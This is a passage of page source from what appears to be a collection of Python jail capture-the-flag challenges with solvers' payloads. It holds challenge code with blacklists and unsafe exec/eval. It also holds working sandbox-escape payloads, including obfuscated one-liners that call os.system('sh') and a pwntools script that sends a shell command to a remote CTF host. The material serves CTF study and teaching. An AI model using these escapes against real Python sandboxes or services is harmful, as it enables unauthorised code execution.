                  &#96;------""""""""

'''</span><span class="token punctuation">)</span>

stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'Enter command: '</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

prompt <span class="token operator">=</span> prompt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'unicode-escape'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span>
prompt <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'unicode-escape'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>blacklisted_chars<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted character detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>blacklisted_words<span class="token punctuation">,</span> prompt<span class="token punctuation">,</span> re<span class="token punctuation">.</span>I<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted word detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklisted_unicode_pattern<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Blacklisted unicode detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklisted_nonascii<span class="token punctuation">,</span> prompt<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Non-ASCII character detected. Go away!'</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">exec</span><span class="token punctuation">(</span>prompt<span class="token punctuation">)</span>
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span></code>`,uu,Kn,ge,we,s_,ku,Zn,I2=`<code class="language-py"><span class="token comment"># @quasar - setting sys.stdout.flush to breakpoint</span>
<span class="token punctuation">[</span><span class="token builtin">id</span> <span class="token keyword">for</span> sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span>mA<span class="token punctuation">]</span> <span class="token keyword">for</span> aA<span class="token punctuation">,</span>bA<span class="token punctuation">,</span>cA<span class="token punctuation">,</span>dA<span class="token punctuation">,</span>eA<span class="token punctuation">,</span>fA<span class="token punctuation">,</span>gA<span class="token punctuation">,</span>hA<span class="token punctuation">,</span>iA<span class="token punctuation">,</span>jA<span class="token punctuation">,</span>kA<span class="token punctuation">,</span>lA<span class="token punctuation">,</span>mA<span class="token punctuation">,</span>nA<span class="token punctuation">,</span>oA<span class="token punctuation">,</span>pA<span class="token punctuation">,</span>qA<span class="token punctuation">,</span>rA<span class="token punctuation">,</span>sA<span class="token punctuation">,</span>tA<span class="token punctuation">,</span>uA<span class="token punctuation">,</span>vA<span class="token punctuation">,</span>wA<span class="token punctuation">,</span>xA<span class="token punctuation">,</span>yA<span class="token punctuation">,</span>zA<span class="token punctuation">,</span>aB<span class="token punctuation">,</span>bB<span class="token punctuation">,</span>cB<span class="token punctuation">,</span>dB<span class="token punctuation">,</span>eB<span class="token punctuation">,</span>fB<span class="token punctuation">,</span>gB<span class="token punctuation">,</span>hB<span class="token punctuation">,</span>iB<span class="token punctuation">,</span>jB<span class="token punctuation">,</span>kB<span class="token punctuation">,</span>lB<span class="token punctuation">,</span>mB<span class="token punctuation">,</span>nB<span class="token punctuation">,</span>oB<span class="token punctuation">,</span>pB<span class="token punctuation">,</span>qB<span class="token punctuation">,</span>rB<span class="token punctuation">,</span>sB<span class="token punctuation">,</span>tB<span class="token punctuation">,</span>uB<span class="token punctuation">,</span>vB<span class="token punctuation">,</span>wB<span class="token punctuation">,</span>xB<span class="token punctuation">,</span>yB<span class="token punctuation">,</span>zB<span class="token punctuation">,</span>aC<span class="token punctuation">,</span>bC<span class="token punctuation">,</span>cC<span class="token punctuation">,</span>dC<span class="token punctuation">,</span>eC<span class="token punctuation">,</span>fC<span class="token punctuation">,</span>gC<span class="token punctuation">,</span>hC<span class="token punctuation">,</span>iC<span class="token punctuation">,</span>jC<span class="token punctuation">,</span>kC<span class="token punctuation">,</span>lC<span class="token punctuation">,</span>mC<span class="token punctuation">,</span>nC<span class="token punctuation">,</span>oC<span class="token punctuation">,</span>pC<span class="token punctuation">,</span>qC<span class="token punctuation">,</span>rC<span class="token punctuation">,</span>sC<span class="token punctuation">,</span>tC<span class="token punctuation">,</span>uC<span class="token punctuation">,</span>vC<span class="token punctuation">,</span>wC<span class="token punctuation">,</span>xC<span class="token punctuation">,</span>yC<span class="token punctuation">,</span>zC<span class="token punctuation">,</span>aD<span class="token punctuation">,</span>bD<span class="token punctuation">,</span>cD<span class="token punctuation">,</span>dD<span class="token punctuation">,</span>eD<span class="token punctuation">,</span>fD<span class="token punctuation">,</span>gD<span class="token punctuation">,</span>hD<span class="token punctuation">,</span>iD<span class="token punctuation">,</span>jD<span class="token punctuation">,</span>kD<span class="token punctuation">,</span>lD<span class="token punctuation">,</span>mD<span class="token punctuation">,</span>nD<span class="token punctuation">,</span>oD<span class="token punctuation">,</span>pD<span class="token punctuation">,</span>qD<span class="token punctuation">,</span>rD<span class="token punctuation">,</span>sD<span class="token punctuation">,</span>tD<span class="token punctuation">,</span>uD<span class="token punctuation">,</span>vD<span class="token punctuation">,</span>wD<span class="token punctuation">,</span>xD<span class="token punctuation">,</span>yD<span class="token punctuation">,</span>zD<span class="token punctuation">,</span>aE<span class="token punctuation">,</span>bE<span class="token punctuation">,</span>cE<span class="token punctuation">,</span>dE<span class="token punctuation">,</span>eE<span class="token punctuation">,</span>fE<span class="token punctuation">,</span>gE<span class="token punctuation">,</span>hE<span class="token punctuation">,</span>iE<span class="token punctuation">,</span>jE<span class="token punctuation">,</span>kE<span class="token punctuation">,</span>lE<span class="token punctuation">,</span>mE<span class="token punctuation">,</span>nE<span class="token punctuation">,</span>oE<span class="token punctuation">,</span>pE<span class="token punctuation">,</span>qE<span class="token punctuation">,</span>rE<span class="token punctuation">,</span>sE<span class="token punctuation">,</span>tE<span class="token punctuation">,</span>uE<span class="token punctuation">,</span>vE<span class="token punctuation">,</span>wE<span class="token punctuation">,</span>xE<span class="token punctuation">,</span>yE<span class="token punctuation">,</span>zE<span class="token punctuation">,</span>aF<span class="token punctuation">,</span>bF<span class="token punctuation">,</span>cF<span class="token punctuation">,</span>dF<span class="token punctuation">,</span>eF<span class="token punctuation">,</span>fF<span class="token punctuation">,</span>gF<span class="token punctuation">,</span>hF<span class="token punctuation">,</span>iF<span class="token punctuation">,</span>jF<span class="token punctuation">,</span>kF<span class="token punctuation">,</span>lF<span class="token punctuation">,</span>mF<span class="token punctuation">,</span>nF<span class="token punctuation">,</span>oF<span class="token punctuation">,</span>pF<span class="token punctuation">,</span>qF<span class="token punctuation">,</span>rF<span class="token punctuation">,</span>sF<span class="token punctuation">,</span>tF<span class="token punctuation">,</span>uF<span class="token punctuation">,</span>vF<span class="token punctuation">,</span>wF<span class="token punctuation">,</span>xF<span class="token punctuation">,</span>yF<span class="token punctuation">,</span>zF<span class="token punctuation">,</span>aG <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">id</span><span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>__dict__<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @st4rn - os.system("sh")</span>
<span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">[</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span>re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>S<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>T<span class="token punctuation">.</span>value<span class="token punctuation">,</span> re<span class="token punctuation">.</span>X<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>U<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token keyword">for</span> re<span class="token punctuation">.</span>RegexFlag<span class="token punctuation">.</span>__getitem__ <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">bytearray</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>A<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">[</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token punctuation">:</span>re<span class="token punctuation">.</span>I<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>L<span class="token punctuation">.</span>value<span class="token operator">^</span>re<span class="token punctuation">.</span>M<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span>

<span class="token comment"># @Satoooon</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

payload <span class="token operator">=</span> <span class="token string">""</span>
<span class="token comment"># get builtins</span>
payload <span class="token operator">+=</span> <span class="token string">"for b in [sys.modules[[k for k in sys.modules][True]]]:None&#92;r"</span>
<span class="token comment"># get input()</span>
payload <span class="token operator">+=</span> <span class="token string">"for ks in [[k for k in b.__dict__]]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for ks in [ks[True:]]:None&#92;r"</span> <span class="token operator">*</span> <span class="token number">28</span>
payload <span class="token operator">+=</span> <span class="token string">"for inp in [b.__dict__[ks[False]]]:None&#92;r"</span>
<span class="token comment"># create "exec"</span>
payload <span class="token operator">+=</span> <span class="token string">"for Nobuffers.__getitem__ in [inp]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for s in [stdout[None]]:None&#92;r"</span>
<span class="token comment"># get exec()</span>
payload <span class="token operator">+=</span> <span class="token string">"for exc in [b.__dict__[s]]:None&#92;r"</span>
<span class="token comment"># exec(input())</span>
payload <span class="token operator">+=</span> <span class="token string">"for v in [stdout[None]]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"for Nobuffers.__getitem__ in [exc]:None&#92;r"</span>
payload <span class="token operator">+=</span> <span class="token string">"stdout[v]"</span>

<span class="token comment"># io = process(["python3","./chall.py"])</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"starship.chal.crewc.tf"</span><span class="token punctuation">,</span> <span class="token number">40002</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"import os; os.system('sh')"</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,ru,Xn,Vp,n_,iu,Qn,ve,Ee,a_,_u,sa,j2=`<code class="language-py"><span class="token keyword">import</span> re
<span class="token keyword">import</span> ast

<span class="token keyword">import</span> void <span class="token comment"># void module contains an ascii art string</span>

<span class="token triple-quoted-string string">"""
Example:

( when root object is A )
path: .B.C["D"][1][2][3]
value: "pyjail is fun!"

->

A.B.C["D"][1][2][3] = "pyjail is fun!"

"""</span>

DISALLOWED_WORDS <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"posix"</span><span class="token punctuation">]</span>
ROOT_OBJECT <span class="token operator">=</span> void

<span class="token keyword">def</span> <span class="token function">abort</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>
	exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">to_value</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	<span class="token keyword">return</span> ast<span class="token punctuation">.</span>literal_eval<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token comment"># gift</span>
module <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"import: "</span><span class="token punctuation">)</span>
<span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span>

path <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"path: "</span><span class="token punctuation">)</span>
value <span class="token operator">=</span> to_value<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"value: "</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

path<span class="token punctuation">,</span> _<span class="token punctuation">,</span> last_item_key<span class="token punctuation">,</span> last_attr_key <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"(.*)([(.*)]|.(.*))"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># set root object</span>
current_obj <span class="token operator">=</span> ROOT_OBJECT

<span class="token comment"># walk object</span>
<span class="token keyword">while</span> path <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">:</span>
	_<span class="token punctuation">,</span> item_key<span class="token punctuation">,</span> attr_key<span class="token punctuation">,</span> path <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r"([(.*?)]|.([^.[]*))(.*)"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> item_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		item_key <span class="token operator">=</span> to_value<span class="token punctuation">(</span>item_key<span class="token punctuation">)</span>
		<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>word <span class="token keyword">in</span> item_key <span class="token keyword">for</span> word <span class="token keyword">in</span> DISALLOWED_WORDS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			abort<span class="token punctuation">(</span><span class="token string">"deny"</span><span class="token punctuation">)</span>
		current_obj <span class="token operator">=</span> current_obj<span class="token punctuation">[</span>item_key<span class="token punctuation">]</span>
	<span class="token keyword">elif</span> attr_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
		<span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token punctuation">[</span>word <span class="token keyword">in</span> attr_key <span class="token keyword">for</span> word <span class="token keyword">in</span> DISALLOWED_WORDS<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
			abort<span class="token punctuation">(</span><span class="token string">"deny"</span><span class="token punctuation">)</span>
		current_obj <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>current_obj<span class="token punctuation">,</span> attr_key<span class="token punctuation">)</span>
	<span class="token keyword">else</span><span class="token punctuation">:</span>
		abort<span class="token punctuation">(</span><span class="token string">"invalid"</span><span class="token punctuation">)</span>


<span class="token comment"># set value</span>
<span class="token keyword">if</span> last_item_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
	last_item_key <span class="token operator">=</span> to_value<span class="token punctuation">(</span>last_item_key<span class="token punctuation">)</span>
	current_obj<span class="token punctuation">[</span>last_item_key<span class="token punctuation">]</span> <span class="token operator">=</span> value
<span class="token keyword">elif</span> last_attr_key <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
	<span class="token builtin">setattr</span><span class="token punctuation">(</span>current_obj<span class="token punctuation">,</span> last_attr_key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Done"</span><span class="token punctuation">)</span></code>`,du,na,he,xe,p_,fu,aa,N2=`<code class="language-py"><span class="token comment"># @Satoooon - https://github.com/search?q=repo%3Apython%2Fcpython+path%3ALib+%2Ffrom+os+import+environ%2F&amp;type=code</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> ctypes<span class="token punctuation">.</span>_aix
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__loader__<span class="token punctuation">.</span>exec_module<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"ctypes._aix"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span>

<span class="token comment"># @maple3142</span>
<span class="token keyword">import</span><span class="token punctuation">:</span> main
<span class="token keyword">import</span><span class="token punctuation">:</span> os
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"__main__"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DISALLOWED_WORDS
value<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
path<span class="token punctuation">:</span> <span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">"help"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__repr__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">"sys"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">"os"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">"PYTHONINSPECT"</span><span class="token punctuation">]</span>
value<span class="token punctuation">:</span> <span class="token string">"1"</span></code>`,mu,pa,$p,t_,bu,ta,Ce,Le,o_,yu,oa,P2=`<code class="language-py"><span class="token comment">#!/usr/local/bin/python3</span>
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> types
<span class="token keyword">import</span> dis

<span class="token keyword">def</span> <span class="token function">is_valid</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    whitelist <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'LOAD_CONST'</span><span class="token punctuation">,</span>
        <span class="token string">'BINARY_OP'</span><span class="token punctuation">,</span>
        <span class="token string">'COMPARE_OP'</span><span class="token punctuation">,</span>
        <span class="token string">'POP_JUMP_BACKWARD_IF_TRUE'</span><span class="token punctuation">,</span>
        <span class="token string">'RETURN_VALUE'</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">for</span> instr <span class="token keyword">in</span> dis<span class="token punctuation">.</span>Bytecode<span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> instr<span class="token punctuation">.</span>opname <span class="token keyword">not</span> <span class="token keyword">in</span> whitelist<span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

        <span class="token keyword">if</span> <span class="token string">'JUMP'</span> <span class="token keyword">in</span> instr<span class="token punctuation">.</span>opname <span class="token keyword">and</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> instr<span class="token punctuation">.</span>argval <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">.</span>co_code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>

    <span class="token keyword">return</span> <span class="token boolean">True</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    _print<span class="token punctuation">,</span> _eval <span class="token operator">=</span> <span class="token keyword">print</span><span class="token punctuation">,</span> <span class="token builtin">eval</span>
    <span class="token comment"># try:</span>
    prog <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'Program: '</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    code <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> prog<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> is_valid<span class="token punctuation">(</span>code<span class="token punctuation">)</span>

    __builtins__<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
    _print<span class="token punctuation">(</span>_eval<span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment"># except:</span>
    <span class="token comment">#     _print('Nice try!')</span></code>`,gu,ea,Te,Ae,e_,wu,ca,H2='<code class="language-py"><span class="token comment"># TBA</span></code>',vu,la,Jp,c_,Eu,ua,Oe,Fe,l_,hu,ka,U2=`<code class="language-py"><span class="token keyword">from</span> types <span class="token keyword">import</span> CodeType

<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> CodeType<span class="token punctuation">(</span>
        code<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>
        code<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span> code<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>
        <span class="token comment"># No consts for youuu</span>
